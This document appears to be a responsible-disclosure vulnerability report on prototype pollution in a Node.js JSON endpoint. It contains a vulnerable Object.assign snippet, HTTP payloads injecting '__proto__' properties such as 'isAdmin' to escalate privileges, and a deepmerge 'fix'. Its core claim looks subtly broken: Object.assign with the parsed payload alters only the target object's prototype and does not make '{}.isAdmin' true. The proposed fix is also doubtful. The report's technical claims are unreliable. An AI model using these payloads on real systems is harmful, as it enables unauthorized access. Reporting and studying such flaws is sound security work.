# 🐞 Prototype Pollution Vulnerability Report

---

## 📌 Title

**Prototype Pollution via `userInput` Parameter in JSON Request**

---

## 📝 Description

A **Prototype Pollution** vulnerability was discovered in the backend request handling of the application. This flaw allows an attacker to manipulate the prototype chain of JavaScript objects, potentially impacting the application's logic, leading to:

- Unauthorized access (e.g., bypassing `isAdmin` checks),
- Application-wide behavior manipulation,
- Denial of service (DoS),
- Security control bypass.

This issue arises due to insecure merging of user input into JavaScript objects using functions like `Object.assign()` or `_.merge()` without input sanitization.

---

## 🌐 Affected Endpoint

- **URL**: `https://vulnerable-website.com/api/save`
- **Method**: `POST`
- **Content-Type**: `application/json`

---

## ⚙️ Vulnerable Code Snippet (Node.js)

```javascript
// ❌ Insecure object merge (prototype pollution vector)
app.post('/api/save', (req, res) => {
    let config = {};
    Object.assign(config, req.body.userInput); // Vulnerable line
    res.send(config);
});
```

---

## 🧪 Steps to Reproduce

### ✅ Pre-requisites

- Use a tool like **Postman**, **cURL**, or **Burp Suite**.
- Ensure server logs or responses can be observed.

### 🔁 Step-by-step

#### Step 1: Send Malicious Payload

```http
POST /api/save HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/json

{
  "userInput": {
    "__proto__": {
      "isAdmin": true
    }
  }
}
```

> This payload pollutes the global `Object.prototype`.

---

#### Step 2: Trigger the Effect

Now, make a new request to any endpoint or functionality that checks:

```javascript
if (user.isAdmin) {
    // Admin-only access
}
```

Even without explicitly setting `user.isAdmin`, the check will return `true`, because it now exists on the prototype chain.

You can confirm by injecting this test:

```javascript
console.log({}.isAdmin); // true ✅
```

---

## 💣 Proof of Concept (PoC)

### Malicious Request

```http
POST /api/save HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/json

{
  "userInput": {
    "__proto__": {
      "canBypassSecurity": true
    }
  }
}
```

### Result (Observed Later)

```javascript
console.log({}.canBypassSecurity); // true
```

---

## 🔥 Security Impact

- **Privilege Escalation**: Bypass role checks (`isAdmin`, etc.)
- **Logic Manipulation**: Tamper with application-wide behavior
- **Denial of Service**: Overwrite core properties like `toString`, crashing the app
- **Persistent Pollution**: May persist across requests in shared-memory environments

---

## 🔧 Recommended Fix

- Sanitize and **block special keys**: `__proto__`, `constructor`, `prototype`
- Avoid direct use of `Object.assign()`, `_.merge()`, or similar without filters
- Use libraries designed to prevent pollution (e.g., `deepmerge` with custom sanitization)

### ✅ Secure Fix Example (with deepmerge)

```javascript
const deepmerge = require('deepmerge');

const config = deepmerge({}, req.body.userInput, {
  customMerge: (key) => {
    if (["__proto__", "constructor", "prototype"].includes(key)) {
      return () => undefined;
    }
    return undefined;
  }
});
```

---

## 🔐 Security Best Practices

- Whitelist allowed input keys (never blindly trust JSON structure)
- Apply schema validation using tools like **Joi**, **Zod**, or **AJV**
- Log and monitor unexpected object keys in request bodies
- Run security static analysis tools and dependency checkers

---

## 🧾 References

- [OWASP - Prototype Pollution](https://owasp.org/www-community/attacks/Prototype_Pollution)
- [PortSwigger - What is Prototype Pollution?](https://portswigger.net/web-security/prototype-pollution)
- [PayloadsAllTheThings - Prototype Pollution](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Injections/Prototype%20Pollution)

---

## 📅 Report Date

**2025-06-17**

---

## 🧑‍💻 Reported By

- **Security Researcher**: raghav  
- **Tools Used**: Burp Suite, Manual Payload Injection  
- **Severity**: **High**

---

> ⚠️ This vulnerability is submitted under responsible disclosure.